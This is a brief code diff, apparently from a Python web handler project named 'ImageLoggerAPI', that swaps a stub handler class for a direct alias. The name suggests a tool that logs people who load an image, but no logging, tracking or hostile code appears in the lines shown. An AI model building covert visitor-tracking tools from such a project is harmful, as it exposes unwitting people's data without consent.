@@ -282,8 +282,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        handler = ImageLoggerAPI
-        pass
-        
+handler = ImageLoggerAPI
